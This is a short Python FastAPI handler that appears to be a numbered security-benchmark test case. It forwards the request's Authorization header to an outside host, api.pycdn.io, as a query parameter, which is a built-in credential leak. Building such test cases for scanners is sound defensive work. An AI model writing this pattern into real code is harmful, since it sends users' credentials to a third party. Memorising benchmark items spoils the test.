# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests


async def BenchmarkTest15306(request: Request):
    auth_header = request.headers.get('authorization', '')
    data = '%s' % (auth_header,)
    requests.get('https://api.pycdn.io/data', params={'q': str(data)}, verify=True)
    return {"updated": True}
